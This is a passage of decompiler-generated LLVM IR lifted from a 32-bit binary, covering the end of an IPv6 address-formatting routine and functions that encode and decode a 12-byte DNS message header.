  %v6_805731d = call i32 @sprintf(i32 %v0_805731c, i32 ptrtoint ([3 x i8]* @global_var_805afb1.566 to i32), i32 %v6_8057313, i32 %v0_8057312)
  store i32 %v6_805731d, i32* %eax.global-to-local, align 4
  %v0_8057325 = load i32, i32* @ebx, align 4
  %v2_8057325 = add i32 %v0_8057325, %v6_805731d
  store i32 %v2_8057325, i32* @ebx, align 4
  br label %dec_label_pc_8057327

dec_label_pc_8057327:                             ; preds = %dec_label_pc_80572ac, %dec_label_pc_80572b0, %dec_label_pc_8057312
  %stack_var_-116.0 = phi i32 [ %v6_8057313, %dec_label_pc_8057312 ], [ %stack_var_-116.161, %dec_label_pc_80572ac ], [ %stack_var_-116.161, %dec_label_pc_80572b0 ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805afb1.566, i32 0, i32 0), %dec_label_pc_8057312 ], [ %stack_var_-120.162, %dec_label_pc_80572ac ], [ %stack_var_-120.162, %dec_label_pc_80572b0 ]
  %v0_80572b020 = phi i32 [ %v2_8057325, %dec_label_pc_8057312 ], [ %v0_80572ba63, %dec_label_pc_80572ac ], [ %v1_80572b3, %dec_label_pc_80572b0 ]
  %v0_8057327 = load i32, i32* @esi, align 4
  %v1_8057327 = add i32 %v0_8057327, 1
  %v0_8057331.pre = load i32, i32* @edi, align 4
  store i32 %v1_8057327, i32* @esi, align 4
  %v7_805732b = icmp sgt i32 %v1_8057327, 7
  %v10_8057331 = icmp eq i32 %v0_8057331.pre, -1
  br i1 %v7_805732b, label %dec_label_pc_8057331, label %dec_label_pc_805729c

dec_label_pc_8057331:                             ; preds = %dec_label_pc_8057327
  br i1 %v10_8057331, label %dec_label_pc_8057342, label %dec_label_pc_8057336

dec_label_pc_8057336:                             ; preds = %dec_label_pc_8057331, %dec_label_pc_8057302
  %v0_805733e = phi i32 [ %v0_80572b020, %dec_label_pc_8057331 ], [ %v3_805730e, %dec_label_pc_8057302 ]
  %v0_8057336 = phi i32 [ %v0_8057331.pre, %dec_label_pc_8057331 ], [ %v0_8057336.pre, %dec_label_pc_8057302 ]
  %v1_8057336 = load i32, i32* @ebp, align 4
  %v2_8057336 = add i32 %v1_8057336, %v0_8057336
  store i32 %v2_8057336, i32* %eax.global-to-local, align 4
  %v9_8057339 = icmp eq i32 %v2_8057336, 8
  %v1_805733c = icmp eq i1 %v9_8057339, false
  br i1 %v1_805733c, label %dec_label_pc_8057342, label %dec_label_pc_805733e

dec_label_pc_805733e:                             ; preds = %dec_label_pc_8057336
  %v1_805733e = inttoptr i32 %v0_805733e to i8*
  store i8 58, i8* %v1_805733e, align 1
  %v0_8057341 = load i32, i32* @ebx, align 4
  %v1_8057341 = add i32 %v0_8057341, 1
  store i32 %v1_8057341, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8057342

dec_label_pc_8057342:                             ; preds = %dec_label_pc_8057336, %dec_label_pc_8057331, %dec_label_pc_805733e
  %v0_8057346 = phi i32 [ %v0_805733e, %dec_label_pc_8057336 ], [ %v0_80572b020, %dec_label_pc_8057331 ], [ %v1_8057341, %dec_label_pc_805733e ]
  store i32 %v2_8057291, i32* %edx.global-to-local, align 4
  %v1_8057346 = add i32 %v0_8057346, 1
  store i32 %v1_8057346, i32* %eax.global-to-local, align 4
  %v1_8057349 = inttoptr i32 %v0_8057346 to i8*
  store i8 0, i8* %v1_8057349, align 1
  %v0_805734c = load i32, i32* %eax.global-to-local, align 4
  %v1_805734c = load i32, i32* %edx.global-to-local, align 4
  %v2_805734c = sub i32 %v0_805734c, %v1_805734c
  store i32 %v2_805734c, i32* @eax, align 4
  %tmp76 = icmp ugt i32 %v2_805734c, %arg4
  br i1 %tmp76, label %dec_label_pc_8057354, label %dec_label_pc_8057361

dec_label_pc_8057354:                             ; preds = %dec_label_pc_8057342
  %v0_8057354 = load i8*, i8** %stack_var_-124, align 4
  %v1_8057354 = ptrtoint i8* %v0_8057354 to i32
  %v2_8057354 = call i32 @__errno_location(i32 %v1_8057354)
  store i32 %v2_8057354, i32* %eax.global-to-local, align 4
  %v1_8057359 = inttoptr i32 %v2_8057354 to i32*
  store i32 28, i32* %v1_8057359, align 4
  br label %dec_label_pc_8057382

dec_label_pc_8057361:                             ; preds = %dec_label_pc_8057342
  %v0_8057361 = load i32, i32* @edi, align 4
  store i32 %v0_8057361, i32* %stack_var_-112, align 4
  %tmp46 = bitcast i8** %stack_var_12 to i32*
  %v3_80573643 = load i32, i32* %tmp46, align 4
  %tmp47 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_80573643, i32* %tmp47, align 4
  %v0_805736b.cast = inttoptr i32 %v3_80573643 to i8*
  %v5_805736b = call i32 @strcpy(i8* %v0_805736b.cast, i32 %v2_8057291)
  store i32 %v5_805736b, i32* %eax.global-to-local, align 4
  store i32 %v5_805736b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057384

dec_label_pc_8057377:                             ; preds = %dec_label_pc_80571cd
  %v1_8057377 = call i32 @__errno_location(i32 %v0_80571c0)
  store i32 %v1_8057377, i32* %eax.global-to-local, align 4
  %v1_805737c = inttoptr i32 %v1_8057377 to i32*
  store i32 97, i32* %v1_805737c, align 4
  br label %dec_label_pc_8057382

dec_label_pc_8057382:                             ; preds = %dec_label_pc_8057354, %dec_label_pc_8057377
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057384

dec_label_pc_8057384:                             ; preds = %dec_label_pc_80572db, %dec_label_pc_8057361, %dec_label_pc_80571d8, %dec_label_pc_8057382
  %v0_8057387 = phi i32 [ 0, %dec_label_pc_80572db ], [ %v5_805736b, %dec_label_pc_8057361 ], [ %v3_80571e4, %dec_label_pc_80571d8 ], [ 0, %dec_label_pc_8057382 ]
  store i32 %v0_8057387, i32* %eax.global-to-local, align 4
  store i32 %v0_80571c0, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8057387

; uselistorder directives
  uselistorder i32 %v0_8057387, { 1, 0 }
  uselistorder i32 %v0_8057346, { 1, 0 }
  uselistorder i1 %v10_8057331, { 1, 0 }
  uselistorder i32 %v0_8057331.pre, { 1, 0, 2 }
  uselistorder i32 %v1_8057327, { 1, 0, 2 }
  uselistorder i32 %v1_8057313, { 1, 0 }
  uselistorder i32 %v0_805731c, { 3, 2, 0, 1 }
  uselistorder i32 %v2_80572a8, { 1, 0 }
  uselistorder i32 %v2_80572a1, { 1, 2, 0 }
  uselistorder i32 %stack_var_-116.161, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.162, { 2, 1, 0 }
  uselistorder i32 %v0_80572ba63, { 3, 2, 1, 0 }
  uselistorder i32 %v1_80572ac64, { 2, 1, 0 }
  uselistorder i32 %v0_80572b665, { 2, 6, 5, 1, 4, 3, 0 }
  uselistorder i32 %v2_8057291, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_805733119, { 1, 0 }
  uselistorder i32 %v1_8057286, { 1, 0 }
  uselistorder i32 %v0_8057286, { 1, 0, 2 }
  uselistorder i32 %v5_805728e, { 1, 2, 0 }
  uselistorder i32 %v1_8057269, { 0, 2, 1 }
  uselistorder i32 %v0_805725910, { 1, 2, 0, 3 }
  uselistorder i32 %v0_805726414, { 1, 2, 0, 3 }
  uselistorder i1 %v10_8057254, { 1, 0 }
  uselistorder i32 %v0_805727f67, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805727468, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_805726970, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_805722171, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_80571c0, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 5, 4, 2, 6, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 14, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 22, 21 }
  uselistorder i32 97, { 5, 6, 4, 0, 3, 2, 1 }
  uselistorder i32 (i8*, i32)* @strcpy, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @sprintf, { 0, 2, 1 }
  uselistorder [3 x i8]* @global_var_805afb1.566, { 1, 0 }
  uselistorder i8 58, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 65535, { 0, 1, 3, 2 }
  uselistorder i32 64, { 8, 3, 10, 7, 9, 6, 2, 4, 0, 5, 1 }
  uselistorder i32* @esp, { 0, 1, 147, 7, 148, 149, 150, 151, 152, 153, 8, 262, 263, 264, 265, 266, 267, 268, 10, 269, 270, 271, 272, 273, 16, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 12, 284, 285, 286, 13, 287, 9, 288, 289, 290, 291, 292, 293, 14, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 11, 307, 308, 309, 310, 311, 312, 15, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 156, 17, 157, 2, 3, 335, 4, 5, 6, 18, 158, 159, 160, 161, 19, 162, 163, 164, 165, 22, 166, 167, 168, 23, 169, 24, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 21, 183, 25, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 20, 196, 197, 198, 199, 154, 155, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 80, 79, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 102, 101, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 260, 261, 334 }
  uselistorder i32 15, { 1, 5, 9, 8, 2, 7, 6, 3, 4, 0 }
  uselistorder i32 60, { 5, 6, 7, 8, 1, 9, 4, 3, 2, 0 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 12, 11, 14, 13 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 10, 7, 8, 9, 4, 18, 16, 15, 17, 5, 0, 1, 2, 3, 6, 11, 12, 13, 14 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8057384, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8057382, { 1, 0 }
  uselistorder label %dec_label_pc_8057342, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057327, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80572be, { 1, 0 }
  uselistorder label %dec_label_pc_80572b6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805729c, { 1, 0 }
  uselistorder label %dec_label_pc_8057291, { 1, 0 }
  uselistorder label %dec_label_pc_8057281, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805727d, { 1, 0 }
  uselistorder label %dec_label_pc_8057269, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8057266, { 1, 0 }
  uselistorder label %dec_label_pc_805723c, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8057394 = load i32, i32* @ebx, align 4
  store i32 %v0_8057394, i32* %stack_var_-8, align 4
  store i32 %tmp8, i32* %ebx.global-to-local, align 4
  %v4_805739e = ptrtoint i8* %tmp to i32
  store i32 %v4_805739e, i32* %esi.global-to-local, align 4
  %v7_80573a2 = icmp sgt i32 %tmp9, 11
  br i1 %v7_80573a2, label %dec_label_pc_80573a8, label %dec_label_pc_805743c

dec_label_pc_80573a8:                             ; preds = %entry
  %v1_80573a8 = add i32 %tmp8, 1
  %v2_80573a8 = inttoptr i32 %v1_80573a8 to i8*
  %v3_80573a8 = load i8, i8* %v2_80573a8, align 1
  store i8 %v3_80573a8, i8* %tmp, align 1
  %v0_80573ae = load i32, i32* %ebx.global-to-local, align 4
  %v1_80573ae = inttoptr i32 %v0_80573ae to i32*
  %v2_80573ae = load i32, i32* %v1_80573ae, align 4
  %v1_80573b0 = trunc i32 %v2_80573ae to i8
  %v2_80573b0 = load i32, i32* %esi.global-to-local, align 4
  %v3_80573b0 = add i32 %v2_80573b0, 1
  %v4_80573b0 = inttoptr i32 %v3_80573b0 to i8*
  store i8 %v1_80573b0, i8* %v4_80573b0, align 1
  store i32 4, i32* %edx.global-to-local, align 4
  %v0_80573d5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80573d5 = add i32 %v0_80573d5, 8
  %v2_80573d5 = inttoptr i32 %v1_80573d5 to i32*
  %v3_80573d5 = load i32, i32* %v2_80573d5, align 4
  %v1_80573d8 = mul i32 %v3_80573d5, 8
  %v2_80573db = and i32 %v1_80573d8, 120
  %v2_80573de = or i32 %v2_80573db, 4
  store i32 %v2_80573de, i32* %edx.global-to-local, align 4
  %v1_80573e0 = add i32 %v0_80573d5, 20
  %v2_80573e0 = inttoptr i32 %v1_80573e0 to i32*
  %v3_80573e0 = load i32, i32* %v2_80573e0, align 4
  %v4_80573e0 = icmp eq i32 %v3_80573e0, 0
  %v1_80573e4 = icmp eq i1 %v4_80573e0, false
  %v2_80573e4 = zext i1 %v1_80573e4 to i32
  %v2_80573e7 = or i32 %v2_80573e4, %v2_80573de
  store i32 %v2_80573e7, i32* %edx.global-to-local, align 4
  %v2_80573e9 = or i32 %v2_80573e7, 130
  %v3_80573e9 = trunc i32 %v2_80573e9 to i8
  store i32 %v2_80573e9, i32* @ecx, align 4
  %v2_80573eb = load i32, i32* %esi.global-to-local, align 4
  %v3_80573eb = add i32 %v2_80573eb, 2
  %v4_80573eb = inttoptr i32 %v3_80573eb to i8*
  store i8 %v3_80573e9, i8* %v4_80573eb, align 1
  %v0_80573ee = load i32, i32* %ebx.global-to-local, align 4
  %v1_80573f2 = add i32 %v0_80573ee, 28
  %v2_80573f2 = inttoptr i32 %v1_80573f2 to i8*
  %v3_80573f2 = load i8, i8* %v2_80573f2, align 1
  %v5_80573f2 = load i32, i32* %edx.global-to-local, align 4
  %v2_80573fb = urem i8 %v3_80573f2, 16
  %v7_80573fb = zext i8 %v2_80573fb to i32
  %v9_80573fb = and i32 %v5_80573f2, -256
  %v10_80573fb = or i32 %v9_80573fb, %v7_80573fb
  store i32 %v10_80573fb, i32* %edx.global-to-local, align 4
  %v2_80573fe = or i8 %v2_80573fb, -128
  %v2_8057400 = load i32, i32* %esi.global-to-local, align 4
  %v3_8057400 = add i32 %v2_8057400, 3
  %v4_8057400 = inttoptr i32 %v3_8057400 to i8*
  store i8 %v2_80573fe, i8* %v4_8057400, align 1
  %v0_8057403 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057403 = add i32 %v0_8057403, 33
  %v2_8057403 = inttoptr i32 %v1_8057403 to i8*
  %v3_8057403 = load i8, i8* %v2_8057403, align 1
  %v2_8057407 = load i32, i32* %esi.global-to-local, align 4
  %v3_8057407 = add i32 %v2_8057407, 4
  %v4_8057407 = inttoptr i32 %v3_8057407 to i8*
  store i8 %v3_8057403, i8* %v4_8057407, align 1
  %v0_805740a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805740a = add i32 %v0_805740a, 32
  %v2_805740a = inttoptr i32 %v1_805740a to i32*
  %v3_805740a = load i32, i32* %v2_805740a, align 4
  %v1_805740d = trunc i32 %v3_805740a to i8
  %v2_805740d = load i32, i32* %esi.global-to-local, align 4
  %v3_805740d = add i32 %v2_805740d, 5
  %v4_805740d = inttoptr i32 %v3_805740d to i8*
  store i8 %v1_805740d, i8* %v4_805740d, align 1
  %v0_8057410 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057410 = add i32 %v0_8057410, 37
  %v2_8057410 = inttoptr i32 %v1_8057410 to i8*
  %v3_8057410 = load i8, i8* %v2_8057410, align 1
  %v2_8057414 = load i32, i32* %esi.global-to-local, align 4
  %v3_8057414 = add i32 %v2_8057414, 6
  %v4_8057414 = inttoptr i32 %v3_8057414 to i8*
  store i8 %v3_8057410, i8* %v4_8057414, align 1
  %v0_8057417 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057417 = add i32 %v0_8057417, 36
  %v2_8057417 = inttoptr i32 %v1_8057417 to i32*
  %v3_8057417 = load i32, i32* %v2_8057417, align 4
  %v1_805741a = trunc i32 %v3_8057417 to i8
  %v2_805741a = load i32, i32* %esi.global-to-local, align 4
  %v3_805741a = add i32 %v2_805741a, 7
  %v4_805741a = inttoptr i32 %v3_805741a to i8*
  store i8 %v1_805741a, i8* %v4_805741a, align 1
  %v0_805741d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805741d = add i32 %v0_805741d, 41
  %v2_805741d = inttoptr i32 %v1_805741d to i8*
  %v3_805741d = load i8, i8* %v2_805741d, align 1
  %v2_8057421 = load i32, i32* %esi.global-to-local, align 4
  %v3_8057421 = add i32 %v2_8057421, 8
  %v4_8057421 = inttoptr i32 %v3_8057421 to i8*
  store i8 %v3_805741d, i8* %v4_8057421, align 1
  %v0_8057424 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057424 = add i32 %v0_8057424, 40
  %v2_8057424 = inttoptr i32 %v1_8057424 to i32*
  %v3_8057424 = load i32, i32* %v2_8057424, align 4
  %v1_8057427 = trunc i32 %v3_8057424 to i8
  %v2_8057427 = load i32, i32* %esi.global-to-local, align 4
  %v3_8057427 = add i32 %v2_8057427, 9
  %v4_8057427 = inttoptr i32 %v3_8057427 to i8*
  store i8 %v1_8057427, i8* %v4_8057427, align 1
  %v0_805742a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805742a = add i32 %v0_805742a, 45
  %v2_805742a = inttoptr i32 %v1_805742a to i8*
  %v3_805742a = load i8, i8* %v2_805742a, align 1
  %v2_805742e = load i32, i32* %esi.global-to-local, align 4
  %v3_805742e = add i32 %v2_805742e, 10
  %v4_805742e = inttoptr i32 %v3_805742e to i8*
  store i8 %v3_805742a, i8* %v4_805742e, align 1
  %v0_8057431 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057431 = add i32 %v0_8057431, 44
  %v2_8057431 = inttoptr i32 %v1_8057431 to i32*
  %v3_8057431 = load i32, i32* %v2_8057431, align 4
  %v1_8057434 = trunc i32 %v3_8057431 to i8
  %v2_8057434 = load i32, i32* %esi.global-to-local, align 4
  %v3_8057434 = add i32 %v2_8057434, 11
  %v4_8057434 = inttoptr i32 %v3_8057434 to i8*
  store i8 %v1_8057434, i8* %v4_8057434, align 1
  %v2_805743c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805743c

dec_label_pc_805743c:                             ; preds = %entry, %dec_label_pc_80573a8
  %v2_805743c = phi i32 [ %v0_8057394, %entry ], [ %v2_805743c.pre, %dec_label_pc_80573a8 ]
  %v0_805743e = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_80573a8 ]
  store i32 %v2_805743c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805743e

; uselistorder directives
  uselistorder i32 45, { 5, 2, 4, 1, 0, 3 }
  uselistorder i32 41, { 2, 1, 0 }
  uselistorder i32 37, { 4, 2, 1, 3, 0 }
  uselistorder i32 33, { 5, 3, 4, 1, 2, 0 }
  uselistorder i32 130, { 1, 2, 0 }
  uselistorder i32 120, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_805743c, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_8057440 = load i32, i32* @ebx, align 4
  store i32 %v0_8057440, i32* %stack_var_-4, align 4
  %v4_8057441 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_8057441, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_8057449 = load i8, i8* %tmp2, align 1
  %v3_8057449 = zext i8 %v2_8057449 to i32
  %v1_805744c = add i32 %v4_8057441, 1
  %v2_805744c = inttoptr i32 %v1_805744c to i8*
  %v3_805744c = load i8, i8* %v2_805744c, align 1
  %v4_805744c = zext i8 %v3_805744c to i32
  %v2_8057450 = mul nuw nsw i32 %v3_8057449, 256
  %v2_8057453 = or i32 %v4_805744c, %v2_8057450
  %v2_8057455 = inttoptr i32 %tmp to i32*
  store i32 %v2_8057453, i32* %v2_8057455, align 4
  %v0_8057457 = load i32, i32* @ecx, align 4
  %v1_8057457 = add i32 %v0_8057457, 2
  %v2_8057457 = inttoptr i32 %v1_8057457 to i8*
  %v3_8057457 = load i8, i8* %v2_8057457, align 1
  %tmp6 = icmp slt i8 %v3_8057457, 0
  %v2_805745b = zext i1 %tmp6 to i32
  %v1_805745e = load i32, i32* %ebx.global-to-local, align 4
  %v2_805745e = add i32 %v1_805745e, 4
  %v3_805745e = inttoptr i32 %v2_805745e to i32*
  store i32 %v2_805745b, i32* %v3_805745e, align 4
  %v0_8057461 = load i32, i32* @ecx, align 4
  %v1_8057461 = add i32 %v0_8057461, 2
  %v2_8057461 = inttoptr i32 %v1_8057461 to i8*
  %v3_8057461 = load i8, i8* %v2_8057461, align 1
  %v3_8057464 = udiv i8 %v3_8057461, 8
  %tmp7 = urem i8 %v3_8057464, 16
  %v1_8057467 = zext i8 %tmp7 to i32
  %v1_805746a = load i32, i32* %ebx.global-to-local, align 4
  %v2_805746a = add i32 %v1_805746a, 8
  %v3_805746a = inttoptr i32 %v2_805746a to i32*
  store i32 %v1_8057467, i32* %v3_805746a, align 4
  %v0_805746d = load i32, i32* @ecx, align 4
  %v1_805746d = add i32 %v0_805746d, 2
  %v2_805746d = inttoptr i32 %v1_805746d to i8*
  %v3_805746d = load i8, i8* %v2_805746d, align 1
  %div = udiv i8 %v3_805746d, 4
  %tmp8 = urem i8 %div, 2
  %v1_8057474 = zext i8 %tmp8 to i32
  %v1_8057477 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057477 = add i32 %v1_8057477, 12
  %v3_8057477 = inttoptr i32 %v2_8057477 to i32*
  store i32 %v1_8057474, i32* %v3_8057477, align 4
  %v0_805747a = load i32, i32* @ecx, align 4
  %v1_805747a = add i32 %v0_805747a, 2
  %v2_805747a = inttoptr i32 %v1_805747a to i8*
  %v3_805747a = load i8, i8* %v2_805747a, align 1
  %div5 = udiv i8 %v3_805747a, 2
  %tmp9 = urem i8 %div5, 2
  %v1_8057480 = zext i8 %tmp9 to i32
  %v1_8057483 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057483 = add i32 %v1_8057483, 16
  %v3_8057483 = inttoptr i32 %v2_8057483 to i32*
  store i32 %v1_8057480, i32* %v3_8057483, align 4
  %v0_8057486 = load i32, i32* @ecx, align 4
  %v1_8057486 = add i32 %v0_8057486, 2
  %v2_8057486 = inttoptr i32 %v1_8057486 to i8*
  %v3_8057486 = load i8, i8* %v2_8057486, align 1
  %tmp10 = urem i8 %v3_8057486, 2
  %v1_805748a = zext i8 %tmp10 to i32
  %v1_805748d = load i32, i32* %ebx.global-to-local, align 4
  %v2_805748d = add i32 %v1_805748d, 20
  %v3_805748d = inttoptr i32 %v2_805748d to i32*
  store i32 %v1_805748a, i32* %v3_805748d, align 4
  %v0_8057490 = load i32, i32* @ecx, align 4
  %v1_8057490 = add i32 %v0_8057490, 3
  %v2_8057490 = inttoptr i32 %v1_8057490 to i8*
  %v3_8057490 = load i8, i8* %v2_8057490, align 1
  %tmp11 = icmp slt i8 %v3_8057490, 0
  %v2_8057494 = zext i1 %tmp11 to i32
  %v1_8057497 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057497 = add i32 %v1_8057497, 24
  %v3_8057497 = inttoptr i32 %v2_8057497 to i32*
  store i32 %v2_8057494, i32* %v3_8057497, align 4
  %v0_805749a = load i32, i32* @ecx, align 4
  %v1_805749a = add i32 %v0_805749a, 3
  %v2_805749a = inttoptr i32 %v1_805749a to i8*
  %v3_805749a = load i8, i8* %v2_805749a, align 1
  %tmp12 = urem i8 %v3_805749a, 16
  %v1_805749e = zext i8 %tmp12 to i32
  %v1_80574a1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80574a1 = add i32 %v1_80574a1, 28
  %v3_80574a1 = inttoptr i32 %v2_80574a1 to i32*
  store i32 %v1_805749e, i32* %v3_80574a1, align 4
  %v0_80574a4 = load i32, i32* @ecx, align 4
  %v1_80574a4 = add i32 %v0_80574a4, 4
  %v2_80574a4 = inttoptr i32 %v1_80574a4 to i8*
  %v3_80574a4 = load i8, i8* %v2_80574a4, align 1
  %v4_80574a4 = zext i8 %v3_80574a4 to i32
  %v1_80574a8 = add i32 %v0_80574a4, 5
  %v2_80574a8 = inttoptr i32 %v1_80574a8 to i8*
  %v3_80574a8 = load i8, i8* %v2_80574a8, align 1
  %v4_80574a8 = zext i8 %v3_80574a8 to i32
  %v2_80574ac = mul nuw nsw i32 %v4_80574a4, 256
  %v2_80574af = or i32 %v4_80574a8, %v2_80574ac
  %v1_80574b1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80574b1 = add i32 %v1_80574b1, 32
  %v3_80574b1 = inttoptr i32 %v2_80574b1 to i32*
  store i32 %v2_80574af, i32* %v3_80574b1, align 4
  %v0_80574b4 = load i32, i32* @ecx, align 4
  %v1_80574b4 = add i32 %v0_80574b4, 6
  %v2_80574b4 = inttoptr i32 %v1_80574b4 to i8*
  %v3_80574b4 = load i8, i8* %v2_80574b4, align 1
  %v4_80574b4 = zext i8 %v3_80574b4 to i32
  %v1_80574b8 = add i32 %v0_80574b4, 7
  %v2_80574b8 = inttoptr i32 %v1_80574b8 to i8*
  %v3_80574b8 = load i8, i8* %v2_80574b8, align 1
  %v4_80574b8 = zext i8 %v3_80574b8 to i32
  %v2_80574bc = mul nuw nsw i32 %v4_80574b4, 256
  %v2_80574bf = or i32 %v4_80574b8, %v2_80574bc
  %v1_80574c1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80574c1 = add i32 %v1_80574c1, 36
  %v3_80574c1 = inttoptr i32 %v2_80574c1 to i32*
  store i32 %v2_80574bf, i32* %v3_80574c1, align 4
  %v0_80574c4 = load i32, i32* @ecx, align 4
  %v1_80574c4 = add i32 %v0_80574c4, 8
  %v2_80574c4 = inttoptr i32 %v1_80574c4 to i8*
  %v3_80574c4 = load i8, i8* %v2_80574c4, align 1
  %v4_80574c4 = zext i8 %v3_80574c4 to i32
  %v1_80574c8 = add i32 %v0_80574c4, 9
  %v2_80574c8 = inttoptr i32 %v1_80574c8 to i8*
  %v3_80574c8 = load i8, i8* %v2_80574c8, align 1
  %v4_80574c8 = zext i8 %v3_80574c8 to i32
  %v2_80574cc = mul nuw nsw i32 %v4_80574c4, 256
  %v2_80574cf = or i32 %v4_80574c8, %v2_80574cc
  %v1_80574d1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80574d1 = add i32 %v1_80574d1, 40
  %v3_80574d1 = inttoptr i32 %v2_80574d1 to i32*
  store i32 %v2_80574cf, i32* %v3_80574d1, align 4
  %v0_80574d4 = load i32, i32* @ecx, align 4
  %v1_80574d4 = add i32 %v0_80574d4, 10
  %v2_80574d4 = inttoptr i32 %v1_80574d4 to i8*
  %v3_80574d4 = load i8, i8* %v2_80574d4, align 1
  %v4_80574d4 = zext i8 %v3_80574d4 to i32
  %v1_80574d8 = add i32 %v0_80574d4, 11
  %v2_80574d8 = inttoptr i32 %v1_80574d8 to i8*
  %v3_80574d8 = load i8, i8* %v2_80574d8, align 1
  %v4_80574d8 = zext i8 %v3_80574d8 to i32
  %v2_80574dc = mul nuw nsw i32 %v4_80574d4, 256
  %v2_80574df = or i32 %v4_80574d8, %v2_80574dc
  %v1_80574e1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80574e1 = add i32 %v1_80574e1, 44
  %v3_80574e1 = inttoptr i32 %v2_80574e1 to i32*
  store i32 %v2_80574df, i32* %v3_80574e1, align 4
  %v2_80574e9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80574e9, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 11, { 14, 15, 3, 4, 7, 8, 16, 5, 9, 10, 11, 12, 6, 13, 2, 1, 0 }
  uselistorder i32 40, { 9, 10, 3, 12, 13, 11, 1, 2, 4, 5, 6, 7, 8, 0 }
